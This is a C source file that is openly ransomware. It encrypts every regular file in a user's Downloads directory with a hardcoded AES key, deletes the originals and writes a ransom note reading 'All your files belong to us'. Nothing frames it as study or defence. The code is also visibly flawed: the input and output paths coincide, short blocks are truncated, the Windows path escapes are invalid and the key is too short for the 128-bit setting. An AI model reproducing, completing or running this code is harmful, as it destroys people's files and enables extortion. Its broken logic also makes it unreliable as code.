#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/aes.h>
#include <dirent.h>

#define AES_BLOCK_SIZE 16

void encryptFile(const char *inputFilename, const char *outputFilename, const char *key) {
    FILE *inputFile = fopen(inputFilename, "rb");
    if (!inputFile) {
        perror("Error opening input file");
        return;
    }

    FILE *outputFile = fopen(outputFilename, "wb");
    if (!outputFile) {
        perror("Error opening output file");
        fclose(inputFile);
        return;
    }

    AES_KEY aesKey;
    AES_set_encrypt_key((const unsigned char *)key, 128, &aesKey);

    unsigned char input[AES_BLOCK_SIZE];
    unsigned char output[AES_BLOCK_SIZE];

    size_t bytesRead;
    while ((bytesRead = fread(input, 1, AES_BLOCK_SIZE, inputFile)) > 0) {
        AES_encrypt(input, output, &aesKey);
        fwrite(output, 1, bytesRead, outputFile);
    }

    fclose(inputFile);
    fclose(outputFile);
}

void createRansomNote(const char *directory) {
    char ransomNotePath[256];
    snprintf(ransomNotePath, sizeof(ransomNotePath), "%s/ransom_note.txt", directory);

    FILE *ransomNote = fopen(ransomNotePath, "w");
    if (ransomNote) {
        fprintf(ransomNote, "All your files belong to us\n");
        fprintf(ransomNote, "       .--.\n");
        fprintf(ransomNote, "      /.-. '----------.\n");
        fprintf(ransomNote, "      \\-' .--\"\"\"`-`-._`-.\n");
        fprintf(ransomNote, "       '--'              '-\n");
        fclose(ransomNote);
    }
}

int main() {
    const char *inputDirectory = "C:\Users\kevin\Downloads";  // Replace with your input directory
    const char *outputDirectory = "C:\Users\kevin\Downloads";  // Replace with your output directory
    const char *key = "mysecretkey";  // Replace with your secret key

    DIR *dir = opendir(inputDirectory);
    if (!dir) {
        perror("Error opening input directory");
        return 1;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {  // Regular file
            char inputFilePath[256];
            char outputFilePath[256];
            snprintf(inputFilePath, sizeof(inputFilePath), "%s/%s", inputDirectory, entry->d_name);
            snprintf(outputFilePath, sizeof(outputFilePath), "%s/%s", outputDirectory, entry->d_name);

            encryptFile(inputFilePath, outputFilePath, key);
            printf("File encrypted: %s\n", entry->d_name);

            // Delete the original file after encryption
            remove(inputFilePath);
        }
    }

    closedir(dir);

    createRansomNote(outputDirectory);
    printf("All files in the directory encrypted successfully, ransom note added!\n");

    return 0;
}
